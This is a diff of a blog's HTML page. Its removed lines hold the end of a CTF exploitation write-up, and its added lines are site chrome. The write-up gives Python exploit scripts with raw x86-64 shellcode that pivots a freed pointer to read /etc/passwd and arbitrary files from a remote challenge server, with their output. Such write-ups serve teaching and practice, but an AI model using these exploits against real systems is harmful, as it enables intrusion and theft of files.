-<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;c 0 &#39;</span> <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">p_shellcode</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
-<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
-<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>    <span class="c"># receive pesky &#39;&gt; &#39;</span>
-<span class="n">p_pivot</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
-
-<span class="k">print</span> <span class="s">&#39;[+] pivot = 0x{0:08x}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">p_pivot</span><span class="p">)</span>
-
-<span class="c"># let&#39;s crash the binary to see if this works</span>
-<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;c 1</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
-
-<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
-<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>    <span class="c"># receive pesky &#39;&gt; &#39;</span>
-<span class="n">p_tmp</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
-
-<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;u &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">p_tmp</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39; &#39;</span> <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">p_pivot</span><span class="o">-</span><span class="mh">0x10</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
-
-<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
-<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>    <span class="c"># receive pesky &#39;&gt; &#39;</span>
-<span class="n">p_vuln</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
-
-<span class="k">print</span> <span class="s">&#39;[+] vulnerable pointer = 0x{0:08x}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">p_vuln</span><span class="p">)</span>
-
-<span class="c"># send read request to crash binary</span>
-<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;r &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">p_vuln</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
-
-<span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1000</span><span class="p">)</span>
-<span class="c"># terminate connection cleanly</span>
-<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
-<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;x</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
-
-<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></code></pre></div>
-
-
-
-
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">[</span>+<span class="o">]</span> <span class="nv">shellcode</span> <span class="o">=</span> 0x01355030
-<span class="o">[</span>+<span class="o">]</span> <span class="nv">pivot</span> <span class="o">=</span> 0x01355030
-<span class="o">[</span>+<span class="o">]</span> vulnerable <span class="nv">pointer</span> <span class="o">=</span> 0x013552b0
-root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/bin/sh
-...snip...</code></pre></div>
-
-
-<p>This also worked against the remote server! It showed me that there was a user called <code>amazon</code> with home directory <code>/home/amazon</code>. I adapted the exploit a bit to make it read arbitrary files. The instruction that needs adjusting is this one:</p>
-
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="p">;</span> NULL byte fix
-xor byte <span class="o">[</span>rdi + 11<span class="o">]</span>, 0x41</code></pre></div>
-
-
-<p>We need to update the value 11, or <code>0x0b</code>. The exploit code was modified once more, spraying <code>time.sleep()</code> calls here and there:</p>
-
-<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#!/usr/bin/python</span>
-
-<span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
-<span class="kn">import</span> <span class="nn">time</span><span class="o">,</span> <span class="nn">re</span><span class="o">,</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">sys</span>
-
-
-<span class="k">def</span> <span class="nf">getID</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
-    <span class="n">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">r&#39;(\d.*)&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
-    <span class="k">if</span> <span class="n">match</span><span class="p">:</span>
-        <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
-    
-<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
-<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;localhost&#39;</span><span class="p">,</span> <span class="mi">5333</span><span class="p">))</span>
-
-<span class="c"># banner</span>
-<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
-
-<span class="n">length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
-<span class="n">filename</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
-<span class="c"># send first string. this will be our shellcode</span>
-<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;c 0 </span><span class="se">\xeb\x3f\x5f\x80\x77</span><span class="s">&#39;</span><span class="o">+</span><span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;b&#39;</span><span class="p">,</span> <span class="n">length</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;</span><span class="se">\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff</span><span class="s">&#39;</span><span class="o">+</span><span class="n">filename</span><span class="o">+</span><span class="s">&#39;A</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
-
-<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
-<span class="c">#s.recv(2)  # receive pesky &#39;&gt; &#39;</span>
-<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
-<span class="n">p_shellcode</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
-
-<span class="k">print</span> <span class="s">&#39;[+] shellcode = 0x{0:08x}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">p_shellcode</span><span class="p">)</span>
-
-<span class="c"># send second string. this will be our &#39;pivot&#39; pointer. </span>
-<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;c 0 &#39;</span> <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">p_shellcode</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
-
-<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
-<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
-<span class="n">p_pivot</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
-
-<span class="k">print</span> <span class="s">&#39;[+] pivot = 0x{0:08x}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">p_pivot</span><span class="p">)</span>
-
-<span class="c"># let&#39;s crash the binary to see if this works</span>
-<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;c 1</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
-
-<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
-<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
-<span class="n">p_tmp</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
-
-<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;u &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">p_tmp</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39; &#39;</span> <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">p_pivot</span><span class="o">-</span><span class="mh">0x10</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
-
-<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
-<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
-<span class="n">p_vuln</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
-
-<span class="k">print</span> <span class="s">&#39;[+] vulnerable pointer = 0x{0:08x}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">p_vuln</span><span class="p">)</span>
-
-<span class="c"># send read request to crash binary</span>
-<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;r &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">p_vuln</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
-
-<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
-<span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
-
-<span class="c"># terminate connection cleanly</span>
-<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
-<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;x</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
-
-<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></code></pre></div>
-
-
-<p>(Note: this exploit fails if the address contains a NULL byte, a space or a zero, as these truncate data. During the CTF, I experienced no problems).</p>
-
-<p>Now it was a matter of getting the flag. I tried <code>/home/amazon/key</code>, which returned nothing. Next was <code>/home/amazon/flag</code> and that was a bingo :)</p>
-]]></content>
-  </entry>
+<span class="categories">
   
-</feed>
+    <a class='category' href='/blog/categories/ctf/'>ctf</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://barrebas.github.io/blog/2014/10/03/tinyctf/" data-via="" data-counturl="http://barrebas.github.io/blog/2014/10/03/tinyctf/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2014/09/25/CSAW-s3/" title="Previous Post: CSAW CTF expl 300: s3">&laquo; CSAW CTF expl 300: s3</a>
+      
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2014/10/03/tinyctf/">Tinyctf Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/09/25/CSAW-s3/">CSAW CTF Expl 300: S3</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2014 - barrebas -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
